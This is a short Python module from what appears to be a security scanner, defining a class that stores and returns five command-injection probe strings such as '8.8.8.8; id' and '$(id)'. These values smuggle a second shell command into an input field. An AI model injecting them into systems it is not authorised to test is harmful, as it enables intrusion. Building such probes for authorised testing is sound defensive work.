"""Command injection probe module."""

from typing import List


class CommandInjectionProbe:
    """Specialized Command Injection payload vectors."""

    DEFAULT_PAYLOADS: List[str] = [
        "8.8.8.8; id",
        "8.8.8.8 | id",
        "8.8.8.8 && id",
        "$(id)",
        "; whoami #",
    ]

    @staticmethod
    def get_candidate_payloads() -> List[str]:
        return list(CommandInjectionProbe.DEFAULT_PAYLOADS)
